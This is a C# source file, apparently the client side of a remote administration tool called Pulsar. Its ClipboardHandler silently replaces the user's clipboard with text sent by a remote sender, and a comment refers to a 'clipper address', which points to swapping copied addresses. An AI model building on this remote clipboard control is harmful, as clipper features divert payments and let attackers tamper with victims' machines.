using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring.Clipboard;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;

namespace Pulsar.Client.Messages
{
    public class ClipboardHandler : IMessageProcessor
    {
        // Do not use this for changing addresses, the clipper address might have changed (or the clipper may be off altogether).
        public static List<string> _cachedAddresses = new List<string>();

        public static string _lastReceivedClipboardText = string.Empty;
        public static DateTime _lastReceivedTime = DateTime.MinValue;

        public bool CanExecute(IMessage message) => message is SendClipboardData;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case SendClipboardData msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, SendClipboardData message)
        {
            if (_lastReceivedClipboardText == message.ClipboardText || string.IsNullOrEmpty(message.ClipboardText))
            {
                return;
            }

            Debug.WriteLine($"ClipboardHandler: Setting clipboard to: {message.ClipboardText.Substring(0, Math.Min(20, message.ClipboardText.Length))}...");

            Thread clipboardThread = new Thread(() =>
            {
                Thread.CurrentThread.SetApartmentState(ApartmentState.STA);

                try
                {
                    _lastReceivedClipboardText = message.ClipboardText;
                    _lastReceivedTime = DateTime.Now;

                    IDataObject oldData = null;
                    try
                    {
                        oldData = Clipboard.GetDataObject();
                    }
                    catch (Exception) { }

                    Clipboard.SetText(message.ClipboardText);

                    Application.DoEvents();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"ClipboardHandler: Error setting clipboard: {ex.Message}");
                }
            })
            { IsBackground = true };
            clipboardThread.SetApartmentState(ApartmentState.STA);
            clipboardThread.Start();
            clipboardThread.Join(1000);
        }
    }
}